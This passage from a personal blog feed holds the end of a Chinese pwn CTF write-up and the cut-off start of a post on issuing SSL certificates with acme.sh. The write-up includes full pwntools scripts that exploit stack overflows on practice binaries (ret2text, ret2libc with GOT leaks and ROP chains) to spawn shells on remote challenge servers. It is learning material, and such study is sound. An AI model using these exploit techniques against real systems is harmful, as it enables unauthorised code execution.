/></p><p>两个都有，但是它们在IDA里看到的地址并不是程序运行中实际上的地址。</p><p>我也不知道在IDA里可以看到的地址应该被称为什么，暂且叫为<strong>形式地址</strong>。</p><p>这里有一个重要的关系，两个东西的<strong>形式地址</strong>的差和两个东西的<strong>真实地址</strong>的差是相同的。</p><p>因为所有的形式地址我们都是已知的，也就是只要知道了一个东西的真实地址，我们就可以求出其他任何东西的真实地址。</p><p>在这道题中的ELF文件中，有<code>write</code>函数，我们可以利用write函数打印的功能，把自己got表中的内容打印出来从而获得write函数在本次运行中在内存中的真实地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = flat(&#123;(<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) : [level3.plt[<span class="hljs-string">&#x27;write&#x27;</span>], level3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, level3.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">10</span>]&#125;)<br></code></pre></td></tr></table></figure><p>我们首先用plt直接调用write函数，然后之后的参数分别是 返回地址【这里设置为了main，让程序回到开始】，然后是write的三个参数，第一个参数1表示文件句柄，当1是应该会输出到终端，第二个参数就是我们想要输出的东西，第三个参数是输出的最大长度。</p><p>然后我们利用截取前4个字节，用u32，反打包为一个值。【u可以理解为unpack, p则是pack】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">write_addr = u32(sh.recv()[:<span class="hljs-number">4</span>])<br></code></pre></td></tr></table></figure><p>这样我们就获得了write函数的真实地址，从而我们可以获得system和/bin/sh的真实地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">sys_addr = write_addr + (libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br>bin_sh_addr = write_addr + (<span class="hljs-number">0x0015902b</span> - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br></code></pre></td></tr></table></figure><p>最后调用一波即可。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        最终payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>)<br><span class="hljs-comment"># sh = process(&quot;./level3&quot;)</span><br>sh = remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>, <span class="hljs-number">63495</span>)<br>level3 = ELF(<span class="hljs-string">&quot;./level3&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc_32.so.6&quot;</span>)<br>payload1 = flat(&#123;(<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) : [level3.plt[<span class="hljs-string">&#x27;write&#x27;</span>], level3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>], <span class="hljs-number">1</span>, level3.got[<span class="hljs-string">&#x27;write&#x27;</span>], <span class="hljs-number">10</span>]&#125;) <span class="hljs-comment">#利用栈溢出获得存放在got表中的write函数的真实地址</span><br>sh.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload1)<br><br>write_addr = u32(sh.recv()[:<span class="hljs-number">4</span>]) <span class="hljs-comment">#write函数在level3这个elf中的真实地址</span><br>sys_addr = write_addr + (libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>] - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br>bin_sh_addr = write_addr + (<span class="hljs-number">0x0015902b</span> - libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>])<br>payload2 = flat(&#123;(<span class="hljs-number">0x88</span> + <span class="hljs-number">4</span>) : [sys_addr, <span class="hljs-number">0</span>, bin_sh_addr]&#125;)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input:\n&quot;</span>, payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h2 id="buuctf"><a class="markdownIt-Anchor" href="#buuctf"></a> BUUCTF</h2><h3 id="1test_your_nc"><a class="markdownIt-Anchor" href="#1test_your_nc"></a> 1.test_your_nc</h3><p>题如其名，nc后直接获得shell。</p><h3 id="2rip"><a class="markdownIt-Anchor" href="#2rip"></a> 2.rip</h3><p>这道题玄学的很，初学建议跳过这题。</p><p>考点就是ret2text，gets栈溢出+现成的后门漏洞直接get shell。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">15</span>]; <span class="hljs-comment">// [rsp+1h] [rbp-Fh] BYREF</span><br><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;please input&quot;</span>);<br>  gets(s, argv); <span class="hljs-comment">//栈溢出漏洞</span><br>  <span class="hljs-built_in">puts</span>(s);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok,bye!!!&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fun</span><span class="hljs-params">()</span> <span class="hljs-comment">//现成后门函数</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26953</span>)<br>fun_addr = <span class="hljs-number">0x401186</span><br>payload = flat(&#123;<span class="hljs-number">0xF</span> + <span class="hljs-number">8</span>: p64(fun_addr + <span class="hljs-number">1</span>)&#125;) //这道题里必须加p64 平常的题目是不需要加的，地址还要加<span class="hljs-number">1</span> 别人说是栈平衡的原因 不太懂<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="3warmup_csaw_2016"><a class="markdownIt-Anchor" href="#3warmup_csaw_2016"></a> 3.warmup_csaw_2016</h3><p>发现BUUCTF的题里用flat函数构造payload的时候，具体的函数地址都需要封装，比如 <code>flat(&#123;10: p64(sys_addr)&#125;)</code>，而在攻防世界里不封装也没问题，挺奇怪的。以后为了保险都写上封装函数吧！</p><p>这道题也是最简单的ret2text。不多说。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">28253</span>)<br>flag_addr = <span class="hljs-number">0x40060D</span><br>payload = flat(&#123; <span class="hljs-number">0x40</span> + <span class="hljs-number">8</span> : p64(flag_addr)&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="4ciscn_2019_n_1"><a class="markdownIt-Anchor" href="#4ciscn_2019_n_1"></a> 4.ciscn_2019_n_1</h3><p>还是ret2text。这道题的逻辑是通过gets造成的栈溢出修改一个变量的值，从而顺着程序流程获得flag。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">char</span> v1[<span class="hljs-number">44</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-30h] BYREF</span><br>  <span class="hljs-type">float</span> v2; <span class="hljs-comment">// [rsp+2Ch] [rbp-4h]</span><br><br>  v2 = <span class="hljs-number">0.0</span>;<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Let&#x27;s guess the number.&quot;</span>);<br>  gets(v1); <span class="hljs-comment">//栈溢出漏洞</span><br>  <span class="hljs-keyword">if</span> ( v2 == <span class="hljs-number">11.28125</span> )<br>    <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat /flag&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Its value should be 11.28125&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>下面是栈情况</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">-<span class="hljs-number">0000000000000030</span> var_30          db <span class="hljs-number">44</span> dup(?) <span class="hljs-regexp">//</span>v1<br>-<span class="hljs-number">0000000000000004</span> var_4           dd ? <span class="hljs-regexp">//</span>v2<br></code></pre></td></tr></table></figure><p>我们需要将var_4里的值变成11.28125。然而我们不知道浮点数在计算机内部是如何表示的。</p><p>这时候我们可以在IDA View-A里按空格查看汇编代码。找到汇编里代码里的浮点数表示。</p><p><img src="https://upyun.wuuconix.link/image-20220209143749583.png" alt="41348000h" /></p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">26874</span>)<br>float_addr = <span class="hljs-number">0x41348000</span><br>payload = flat(&#123;<span class="hljs-number">0x30</span> - <span class="hljs-number">4</span> : float_addr&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="5pwn1_sctf_2016"><a class="markdownIt-Anchor" href="#5pwn1_sctf_2016"></a> 5.pwn1_sctf_2016</h3><p>还是ret2text。这道题与众不同的是，它是用c++写的，还用了string这个类，反汇编出来的代码十分反人类。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">vuln</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *v0; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> s[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+1Ch] [ebp-3Ch] BYREF</span><br>  <span class="hljs-type">char</span> v3[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+3Ch] [ebp-1Ch] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+40h] [ebp-18h] BYREF</span><br>  <span class="hljs-type">char</span> v5; <span class="hljs-comment">// [esp+47h] [ebp-11h] BYREF</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">7</span>]; <span class="hljs-comment">// [esp+48h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">char</span> v7[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [esp+4Fh] [ebp-9h] BYREF</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Tell me something about yourself: &quot;</span>);<br>  <span class="hljs-built_in">fgets</span>(s, <span class="hljs-number">32</span>, edata); <span class="hljs-comment">//读入32个字符 fgets很安全</span><br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, s);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  std::string::<span class="hljs-built_in">string</span>(v4, <span class="hljs-string">&quot;you&quot;</span>, &amp;v5);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::<span class="hljs-built_in">string</span>(v6, <span class="hljs-string">&quot;I&quot;</span>, v7);<br>  <span class="hljs-built_in">replace</span>((std::string *)v3); <span class="hljs-comment">//会把我们输入的I变成you</span><br>  std::string::<span class="hljs-keyword">operator</span>=(&amp;input, v3, v6, v4);<br>  std::string::~<span class="hljs-built_in">string</span>(v3);<br>  std::string::~<span class="hljs-built_in">string</span>(v6);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(v7);<br>  std::string::~<span class="hljs-built_in">string</span>(v4);<br>  std::allocator&lt;<span class="hljs-type">char</span>&gt;::~<span class="hljs-built_in">allocator</span>(&amp;v5);<br>  v0 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)std::string::<span class="hljs-built_in">c_str</span>((std::string *)&amp;input);<br>  <span class="hljs-built_in">strcpy</span>(s, v0); <span class="hljs-comment">//v0是将I变成you后的字符串，长度会很长，造成s的栈溢出从而ret2text</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;So, %s\n&quot;</span>, s);<br>&#125;<br></code></pre></td></tr></table></figure><p>这道题里用的读入函数是fgets，按理来说是很安全的。但是题目中的逻辑会把字符串中的I变成you，从而将字符串长度变长，再加上strcpy函数的作妖，使得32个字节的s栈溢出。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25003</span>)<br>payload = flat(&#123;<span class="hljs-number">1</span>:  <span class="hljs-string">&quot;I&quot;</span> * <span class="hljs-number">21</span>, <span class="hljs-number">22</span>: p32(<span class="hljs-number">0x08048F0D</span>) &#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="6jarvisoj_level0"><a class="markdownIt-Anchor" href="#6jarvisoj_level0"></a> 6.jarvisoj_level0</h3><p>和 <a href="https://wuuconix.link/2022/01/30/pwn/#2level0">攻防世界#2level0</a>重复。最简单的ret2text，不多说。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">29484</span>)<br>sys_addr = <span class="hljs-number">0x0400596</span><br>payload = flat(&#123; <span class="hljs-number">0x80</span> + <span class="hljs-number">8</span> : p64(sys_addr)&#125;)<br>sh.sendline(payload)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><h3 id="7ciscn_2019_c_1"><a class="markdownIt-Anchor" href="#7ciscn_2019_c_1"></a> 7.ciscn_2019_c_1</h3><p>此题和<a href="https://wuuconix.link/2022/01/30/pwn/#10level3">攻防世界 #10level3</a> 一样，属于ret2libc。IDA中没有发现system，也没有/bin/sh字符串。</p><p>比level3还更难，因为level3直接提供了libc库文件，这道题里没有，我们需要利用LibcSearcher这个库来查找libc版本号。</p><blockquote><p>这里我使用了 <a href="https://github.com/rycbar77/LibcSearcher">rycbar77/LibcSearcher: 根据函数地址查询libc，可本地或在线查询 (github.com)</a> 维护的LibcSearcher，支持本地和在线查询，作者的安装教程也写的很详细。</p></blockquote><p>程序中大量使用了puts函数来进行输出，一旦puts函数被使用，got表中就会存储其真实地址，于是我们再调用puts函数本身，把自己输出出来，作为查询libc版本的依据。</p><p>值得注意的是，由于本地是64位的linux，构造payload传递参数的时候，和32位不同。差别如下。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-id">#32</span>位<br><span class="hljs-selector-tag">elf</span><span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;puts&#x27;</span>]</span>, 返回地址, 参数地址<br><span class="hljs-selector-id">#64</span>位 需要利用<span class="hljs-selector-tag">rdi</span>寄存器存储参数<br><span class="hljs-selector-tag">pop_rdi_addr</span>, 参数地址， <span class="hljs-selector-tag">elf</span><span class="hljs-selector-class">.plt</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;puts&#x27;</span>]</span>, 返回地址<br></code></pre></td></tr></table></figure><p>其中pop_rdi_addr 可以用 <code>ROPgadget --binary ciscn_2019_c_1 | grep &quot;pop rdi&quot;</code>获得。</p><p>在获得puts函数的真实地址后，我们利用LibcSearcher查询libc版本，确定版本后，便可以根据两个函数<strong>真实地址</strong>的差和两个函数<strong>形式地址</strong>的差是相等的这个规律，获得system和/bin/sh的地址。</p><p>最后按照64位调用函数的格式调用即可。</p><p>这道题最后调用的时候还需要栈对齐，这玩意儿我还不太会，但是其格式就是在pop_rdi_addr前面加上ret的地址，先记住吧。</p><div class='spoiler collapsed'>    <div class='spoiler-title'>        payload代码    </div>    <div class='spoiler-content'>        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>sh = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">27340</span>)<br>ciscn = ELF(<span class="hljs-string">&quot;./ciscn_2019_c_1&quot;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your choice!&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>pop_rdi_addr = <span class="hljs-number">0x00400c83</span><br>payload1 = flat(&#123;<span class="hljs-number">0</span>: <span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-number">0x50</span> + <span class="hljs-number">8</span>: [p64(pop_rdi_addr), p64(ciscn.got[<span class="hljs-string">&#x27;puts&#x27;</span>]), p64(ciscn.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]), p64(ciscn.symbols[<span class="hljs-string">&#x27;main&#x27;</span>])]&#125;)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>, payload1)<br>sh.recvuntil(<span class="hljs-string">&quot;Ciphertext\n\n&quot;</span>)<br>puts_addr = u64(sh.recvline()[<span class="hljs-number">0</span>: -<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\0&quot;</span>)) <span class="hljs-comment">#puts函数真实地址</span><br>libc = LibcSearcher(<span class="hljs-string">&quot;puts&quot;</span>, puts_addr)<br>sys_addr = puts_addr + libc.dump(<span class="hljs-string">&quot;system&quot;</span>) - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>str_bin_sh_addr = puts_addr + libc.dump(<span class="hljs-string">&quot;str_bin_sh&quot;</span>) - libc.dump(<span class="hljs-string">&quot;puts&quot;</span>)<br>ret_addr = <span class="hljs-number">0x004006b9</span> <span class="hljs-comment">#用ROPgadget获得ret的地址，用来栈对齐</span><br>payload2 = flat(&#123;<span class="hljs-number">0</span>: <span class="hljs-string">&quot;\0&quot;</span>, <span class="hljs-number">0x50</span> + <span class="hljs-number">8</span>: [p64(ret_addr), p64(pop_rdi_addr), p64(str_bin_sh_addr), p64(sys_addr)]&#125;)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your choice!&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>sh.sendlineafter(<span class="hljs-string">&quot;Input your Plaintext to be encrypted&quot;</span>, payload2)<br>sh.interactive()<br></code></pre></td></tr></table></figure>    </div></div><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>writeup</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用acme.sh快速获取SSL证书</title>
    <link href="/2022/01/29/acme-sh/"/>
    <url>/2022/01/29/acme-sh/</url>
    
    <content type="html"><![CDATA[<header><meta name="referrer" content="never"></header>    <div id="aplayer-LOcQtPWW" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1911450954" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"    ></div><h2 id="背景"><a class="markdownIt-Anchor" href="#背景"></a> 背景</h2><p>之前我的<code>wuuconix.link</code>和<code>wuuconix.xyz</code>域名的SSL证书都是通过 <a href="https://letsencrypt.osfipin.com/">来此加密 - Let’s Encrypt 在线免费申请SSL证书 (osfipin.com)</a> 申请的，它是一个网页端的SSL证书申请工具。</p><p>申请一个域名的SSL证书的步骤很简单。</p><ol><li>填入域名</li><li>根据要求设置一个<code>_acme-challenge</code>的TXT DNS解析记录，它会提示你结果需要为什么。你到你的域名服务商设置好解析后，点击验证。</li><li>网站验证完毕后便可以下载证书</li></ol><p>看起来非常简单，但是这个证书的有效期只有60天，所以你每隔两个月就需要重复着执行这个操作。更可恶的是，这个网站最近在验证DNS解析记录前增加了一段等待时间，而VIP则不需要，验证也需要等待半天，让人很无奈。而且我越来越觉得这个网站完全貌似不是<code>Let's Encrypt</code>证书签发商的官方网站。</p><p>此外，今天闲来无事，在观看了<a href="https://www.bilibili.com/video/BV1zb4y1n7sX?spm_id_from=333.1007.top_right_bar_window_history.content.click">（无需魔法）（无限续费）免费注册一年freenom域名_哔哩哔哩_bilibili</a> 这个视频后，我在freenom上成功白嫖了一堆域名</p><p><img src="https://upyun.wuuconix.link/image-20220128231918207.png" alt="域名万亩荡" /></p><p>想到以后每个域名都需要仍受 来此加密 恶心人的操作，我想试试之前早已耳闻的 脚本自动部署。</p><h2 id="过程"><a class="markdownIt-Anchor" href="#过程"></a> 过程</h2><p>我利用到了这个开源项目 <a href="https://github.com/acmesh-official/acme.sh">acmesh-official/acme.sh: A pure Unix shell script implementing ACME client protocol (github.com)</a></p><p>实际上，证书签发商<code>Let’s Encrpt</code>为了简化自己的操作，设计了一个ACME的协议，用来实现SSL自动化签发，它的主要步骤就是用一条TXT DNS记录来验证这个域名的归属权是否属于你，若成功，便会进行自动生成SSL证书。</p><p>而这个项目<code>acme.sh</code>便是该协议的纯shelll脚本客户端。</p><p>接下来我演示一下 <code>conix.ml</code> 这个域名下泛二级域名（*<strong>.conix.ml</strong>）的SSL证书生成过程。</p><ol><li>使用手动dns验证的方式</li></ol>   <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">acme.sh --issue --dns -d <span class="hljs-string">&quot;*.conix.ml&quot;</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220128233822928.png" alt="--issue" /></p><p>脚本的回显提示我们加添一个<code>_acme-challenge.conix.ml</code>的TXT DNS解析记录，并将值设置为<code>Y2U_vKtQ2umHtsL9LQ37QV-SovNvELzX4HgT4ePfkaw</code>。</p><ol start="2"><li><p>在域名服务商那里添加记录，我的域名的DNS服务商是CloudFlare。为了增快解析生效速度，将TTL设置为1min。</p><p><img src="https://upyun.wuuconix.link/image-20220128233929536.png" alt="DNS" /></p><p>我们可以在windows命令行里使用<code>nslookup -q=txt</code>查看TXT记录是否生效。</p><p><img src="https://upyun.wuuconix.link/image-20220128234038768.png" alt="nslookup" /></p></li><li><p>确定生效后，将之前命令里的<code>--issue</code>更改为<code>--renew</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">acme.sh --issue --dns -d <span class="hljs-string">&quot;*.conix.ml&quot;</span> --yes-I-know-dns-manual-mode-enough-go-ahead-please<br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220128234307614.png" alt="success" /></p><p>可以看到其中醒目的sucess，我们已经成功生成了证书，它的目录在<code>~/.acme.sh/*.conix.ml</code>下</p><p><img src="https://upyun.wuuconix.link/image-20220128234404706.png" alt="证书" /></p></li><li><p>但是官方不推荐我们直接使用这些证书，而是使用类似以下命令放到我们想放的地方。【Tips 文件夹需要首先建好】</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">acme.sh --install-cert -d <span class="hljs-string">&quot;*.conix.ml&quot;</span> \ <br>--key-file       /etc/nginx/conix.ml/key.pem  \<br>--fullchain-file /etc/nginx/conix.ml/cert.pem \<br>--reloadcmd     <span class="hljs-string">&quot;service nginx force-reload&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://upyun.wuuconix.link/image-20220128234658414.png" alt="install-cert" /></p></li><li><p>接下来我们尝试SSL证书是否生效，我们选择一个二级域名 <code>test.conix.ml</code>，设置A记录将DNS解析到你的服务器ip。</p><p><img src="https://upyun.wuuconix.link/image-20220128235523484.png" alt="A" /></p><p>然后nginx写配置文件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span><br>&#123;<br>   <span class="hljs-attribute">listen</span> <span class="hljs-number">443</span> ssl;<span class="hljs-comment"># https 监听的是 443端口</span><br>   <span class="hljs-attribute">server_name</span>  test.conix.ml;<br><br>   <span class="hljs-attribute">keepalive_timeout</span> <span class="hljs-number">100</span>;<br><br>   <span 